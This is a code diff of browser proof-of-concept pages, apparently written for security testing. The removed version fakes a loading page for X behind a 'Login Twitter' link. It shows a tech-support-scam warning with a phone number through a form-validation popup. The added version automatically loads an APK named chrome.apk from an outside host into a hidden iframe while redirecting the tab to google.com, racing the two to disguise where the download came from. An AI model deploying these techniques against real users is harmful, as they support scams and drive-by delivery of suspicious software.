@@ -1,39 +1,78 @@
-<script>
-let w;
-
-function f(e){
-    e.preventDefault();
-
-    w = window.open("about:blank","_blank");
-
-    w.document.open();
-    w.document.write(`
+<!DOCTYPE html>
 <html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Open Tab Race PoC</title>
+<style>
+iframe {
+    display: none;
+    width: 100%;
+    height: 600px;
+    border: 0;
+}
+body {
+    font-family: sans-serif;
+}
+#log {
+    font-family: monospace;
+    margin: 1em;
+}
+</style>
+</head>
 <body>
 
-<h2>Loading X...</h2>
-
-<input id="aaa" required>
+<h1>Download Race PoC</h1>
+<div id="log"></div>
+<iframe id="frame"></iframe>
 
 <script>
-var aaa = document.getElementById("aaa");
-aaa.style.opacity = "0";
+const logDiv = document.getElementById("log");
+const iframe = document.getElementById("frame");
+const url = "https://www.google.com/url?q=https%3A%2F%2Fecdnts-del.github.io%2Ftest-apk%2Fchrome.apk&sa=D&sntz=1&usg=AOvVaw079XKrSIcTiPDZFMOucTH3";
 
-aaa.oninvalid = function(e){
-    e.target.setCustomValidity("WARNING!\\\\nYOUR COMPUTER MAY BE AT RISK.\\\\nCALL: 800-111-2222");
-};
+// Helper log function
+function log(msg){
+    console.log(msg);
+    const d = document.createElement("div");
+    d.textContent = msg;
+    logDiv.appendChild(d);
+}
 
-setTimeout(function(){
-    location.href = "https://x.com";
-},2000);
+// Random delay between 150-350 ms for redirect
+const redirectDelay = Math.floor(Math.random()*200)+150;
 
-<\/script>
+// Trigger iframe download
+function triggerDownload(){
+    log("Reset iframe src");
+    iframe.src = "about:blank"; // reset
+    setTimeout(()=>{
+        log("Setting iframe src to download URL");
+        iframe.src = url;
+    },50);
+}
+
+// Trigger redirect after random delay
+function triggerRedirect(){
+    setTimeout(()=>{
+        log("Redirecting tab to google.com after " + redirectDelay + "ms");
+        window.location.href = "https://google.com";
+    }, redirectDelay);
+}
+
+// Start race test
+function startRace(){
+    log("Starting race test");
+    triggerDownload();
+    triggerRedirect();
+}
+
+// Optional: delay showing iframe (to simulate visual race)
+setTimeout(()=>{ iframe.style.display="block"; log("Iframe now visible"); }, 3500);
+
+// Run race test automatically
+startRace();
+</script>
 
 </body>
 </html>
-`);
-    w.document.close();
-}
-</script>
-
-<a href="#" onclick="f(event)">Login Twitter</a>
